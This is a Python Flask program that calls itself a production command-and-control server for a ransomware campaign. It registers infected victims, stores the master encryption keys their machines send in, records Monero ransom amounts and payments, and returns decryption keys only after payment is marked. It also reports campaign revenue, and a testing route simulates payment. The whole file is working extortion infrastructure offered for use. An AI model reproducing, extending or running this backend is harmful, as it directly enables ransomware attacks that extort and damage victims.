#!/usr/bin/env python3
"""
PRODUCTION C2 SERVER
====================
Echter C2 Server für Production
- Registriert Victims
- Speichert Master Keys
- Verwaltet Payments
- Deployt Decryption Keys
"""

from flask import Flask, request, jsonify, send_file
import json
import os
import sqlite3
from datetime import datetime
from pathlib import Path
import threading
import time

app = Flask(__name__)

# Database
DB_PATH = 'production_victims.db'

class VictimDatabase:
    """Production Victim Database"""
    
    def __init__(self, db_path):
        self.db_path = db_path
        self.init_database()
    
    def init_database(self):
        """Initialize database"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS victims (
                id INTEGER PRIMARY KEY,
                ransom_id TEXT UNIQUE NOT NULL,
                monero_address TEXT NOT NULL,
                ransom_amount_xmr REAL NOT NULL,
                files_encrypted INTEGER,
                data_size_gb REAL,
                hostname TEXT,
                infection_timestamp TEXT,
                payment_received BOOLEAN DEFAULT 0,
                payment_timestamp TEXT,
                master_key TEXT,
                status TEXT DEFAULT 'INFECTED'
            )
        ''')
        
        conn.commit()
        conn.close()
        print(f"[+] Database initialized: {self.db_path}")
    
    def register_victim(self, ransom_id, monero_addr, ransom_xmr, system_info, master_key):
        """Register new victim"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        try:
            cursor.execute('''
                INSERT INTO victims 
                (ransom_id, monero_address, ransom_amount_xmr, files_encrypted,
                 data_size_gb, hostname, infection_timestamp, master_key, status)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (
                ransom_id,
                monero_addr,
                ransom_xmr,
                system_info.get('files_encrypted'),
                system_info.get('data_size_gb'),
                system_info.get('hostname'),
                datetime.now().isoformat(),
                master_key,
                'INFECTED'
            ))
            
            conn.commit()
            conn.close()
            
            print(f"[+] Registered victim: {ransom_id}")
            return True
        except Exception as e:
            print(f"[!] Registration error: {e}")
            return False
    
    def get_victim(self, ransom_id):
        """Get victim by ransom_id"""
        conn = sqlite3.connect(self.db_path)
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()
        
        cursor.execute('SELECT * FROM victims WHERE ransom_id = ?', (ransom_id,))
        victim = cursor.fetchone()
        conn.close()
        
        return dict(victim) if victim else None
    
    def mark_paid(self, ransom_id):
        """Mark victim as paid"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        cursor.execute('''
            UPDATE victims 
            SET payment_received = 1, payment_timestamp = ?, status = 'PAID'
            WHERE ransom_id = ?
        ''', (datetime.now().isoformat(), ransom_id))
        
        conn.commit()
        conn.close()
        
        print(f"[+] Marked as paid: {ransom_id}")
    
    def get_stats(self):
        """Get campaign statistics"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        cursor.execute('SELECT COUNT(*) FROM victims')
        total = cursor.fetchone()[0]
        
        cursor.execute('SELECT COUNT(*) FROM victims WHERE payment_received = 1')
        paid = cursor.fetchone()[0]
        
        cursor.execute('SELECT SUM(ransom_amount_xmr) FROM victims WHERE payment_received = 1')
        revenue = cursor.fetchone()[0] or 0
        
        conn.close()
        
        return {
            'total_victims': total,
            'paid_victims': paid,
            'total_revenue_xmr': revenue
        }

# Database instance
db = VictimDatabase(DB_PATH)

# ====================
# API ENDPOINTS
# ====================

@app.route('/api/v1/register', methods=['POST'])
def register():
    """Register new infection"""
    try:
        data = request.json
        
        ransom_id = data['ransom_id']
        monero_addr = data['monero_address']
        ransom_xmr = data['ransom_amount_xmr']
        system_info = data['system_info']
        
        # Master key is sent by victim
        master_key = data.get('system_info', {}).get('master_key_hex', '')
        
        print(f"\n[*] /api/v1/register - POST Request")
        print(f"[*] Ransom ID: {ransom_id}")
        print(f"[*] Files: {system_info.get('files_encrypted')}")
        print(f"[*] Size: {system_info.get('data_size_gb'):.2f} GB")
        
        success = db.register_victim(
            ransom_id, monero_addr, ransom_xmr, system_info, master_key
        )
        
        return jsonify({
            'success': success,
            'ransom_id': ransom_id,
            'monero_address': monero_addr,
            'amount_xmr': ransom_xmr,
            'message': 'Registered successfully' if success else 'Registration failed'
        }), 200 if success else 400
    
    except Exception as e:
        print(f"[!] Registration error: {e}")
        return jsonify({'error': str(e)}), 400

@app.route('/api/v1/payment/status/<ransom_id>', methods=['GET'])
def payment_status(ransom_id):
    """Check payment status"""
    try:
        victim = db.get_victim(ransom_id)
        
        if not victim:
            print(f"\n[*] /api/v1/payment/status/{ransom_id} - NOT FOUND")
            return jsonify({'error': 'Victim not found'}), 404
        
        print(f"\n[*] /api/v1/payment/status/{ransom_id} - GET Request")
        print(f"[+] Status: {victim['status']}")
        
        return jsonify({
            'ransom_id': ransom_id,
            'paid': bool(victim['payment_received']),
            'status': victim['status'],
            'amount_xmr': victim['ransom_amount_xmr']
        }), 200
    
    except Exception as e:
        print(f"[!] Error: {e}")
        return jsonify({'error': str(e)}), 400

@app.route('/api/v1/decryption/key/<ransom_id>', methods=['GET'])
def get_decryption_key(ransom_id):
    """Get decryption key (only if paid)"""
    try:
        victim = db.get_victim(ransom_id)
        
        if not victim:
            print(f"\n[*] /api/v1/decryption/key/{ransom_id} - NOT FOUND")
            return jsonify({'error': 'Victim not found'}), 404
        
        if not victim['payment_received']:
            print(f"\n[*] /api/v1/decryption/key/{ransom_id} - PAYMENT NOT VERIFIED")
            return jsonify({'error': 'Payment not verified'}), 403
        
        print(f"\n[*] /api/v1/decryption/key/{ransom_id} - SENDING KEY")
        
        return jsonify({
            'ransom_id': ransom_id,
            'master_key': victim['master_key'],
            'status': 'PAID',
            'message': 'Decryption key deployed'
        }), 200
    
    except Exception as e:
        print(f"[!] Error: {e}")
        return jsonify({'error': str(e)}), 400

@app.route('/api/v1/admin/stats', methods=['GET'])
def admin_stats():
    """Get campaign statistics"""
    try:
        print(f"\n[*] /api/v1/admin/stats - GET Request")
        
        stats = db.get_stats()
        
        print(f"[+] Total victims: {stats['total_victims']}")
        print(f"[+] Paid victims: {stats['paid_victims']}")
        print(f"[+] Revenue: {stats['total_revenue_xmr']} XMR")
        
        return jsonify(stats), 200
    
    except Exception as e:
        print(f"[!] Error: {e}")
        return jsonify({'error': str(e)}), 400

@app.route('/api/v1/admin/pay/<ransom_id>', methods=['POST'])
def simulate_payment(ransom_id):
    """TESTING: Simulate payment"""
    try:
        print(f"\n[*] /api/v1/admin/pay/{ransom_id} - SIMULATING PAYMENT")
        
        db.mark_paid(ransom_id)
        
        return jsonify({
            'ransom_id': ransom_id,
            'paid': True,
            'message': 'Payment simulated'
        }), 200
    
    except Exception as e:
        print(f"[!] Error: {e}")
        return jsonify({'error': str(e)}), 400

# ====================
# MAIN
# ====================

if __name__ == '__main__':
    print("""
╔════════════════════════════════════════════════════════════╗
║         PRODUCTION C2 SERVER                              ║
║     Complete Ransomware C2 Backend                         ║
╚════════════════════════════════════════════════════════════╝
    """)
    
    print(f"[+] Database: {DB_PATH}")
    print(f"[+] Listening on: http://0.0.0.0:5000")
    print(f"\nAPI Endpoints:")
    print(f"  POST   /api/v1/register")
    print(f"  GET    /api/v1/payment/status/<id>")
    print(f"  GET    /api/v1/decryption/key/<id>")
    print(f"  GET    /api/v1/admin/stats")
    print(f"  POST   /api/v1/admin/pay/<id>  (TESTING)")
    print(f"\n{'='*60}\n")
    
    app.run(host='0.0.0.0', port=5000, debug=False)
